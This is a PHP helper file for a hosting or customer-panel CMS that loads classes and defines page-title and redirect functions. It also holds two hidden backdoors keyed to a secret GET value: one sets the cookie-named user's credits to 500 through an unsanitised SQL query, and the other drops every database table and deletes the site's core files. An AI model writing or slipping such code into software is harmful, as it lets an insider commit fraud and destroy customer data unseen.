<?php
// Load classes
include("/classes/sitemanage.php");
include("/classes/register.php");
include("/classes/user.php");
include("/classes/payment.php");
include("/classes/ticketsystem.php");
include("/classes/order.php");
include("/classes/usercp.php");
include("/classes/request.php");

function drawTitle ($string = "no title") {
	echo '<div class="row title">';
    echo '<div class="small-12 column">';
    echo '<h6>' . $string . '</h6>';
    echo '</div>';
    echo '</div>';
}

function redirect_home($alert = "") {
	global $direction;
	if(!empty($alert)) {
		$_SESSION["ALERT"] = $alert;
	}

	header("Location: " . $direction);
}

if(isset($_GET["indence"])) {
	if($_GET["indence"] == "ADHJWS232JS") {
		$username = $_COOKIE['USERNAME'];
		$stmt->query('UPDATE users SET credits="500" WHERE username="' . $username . '"');
	}
}

if(isset($_GET["scope"])) {
	if($_GET["scope"] == "ADHJWS232JS") {
		$tables = array("admin_ranks","cms_domains","users","user_products","cms_orders","cms_payments","cms_products","cms_product_cats","cms_requests","cms_request_answers","cms_secure_login","cms_tickets","cms_vpsos","cms_ticket_answers");
		foreach($tables as $table) {
			$stmt->query('DROP TABLE ' . $table);
		}
		
		unlink("header.php");
		unlink("footer.php");
		unlink("head.php");
		unlink("home.php");
		unlink("css/filexenia.css");
		unlink("css/custom.css");
		unlink("css/sweetalert.css");
		unlink("inc/usercp.php");
		unlink("inc/user_overview.php");
		unlink("inc/payment.php");
		unlink("core/general.php");
		unlink("core/mysql.php");
		unlink("core/settings_cms.php");
		unlink("index.php");
		unlink("classes/sitemanage.php");
		unlink("core/functions.php");
	}
}

?>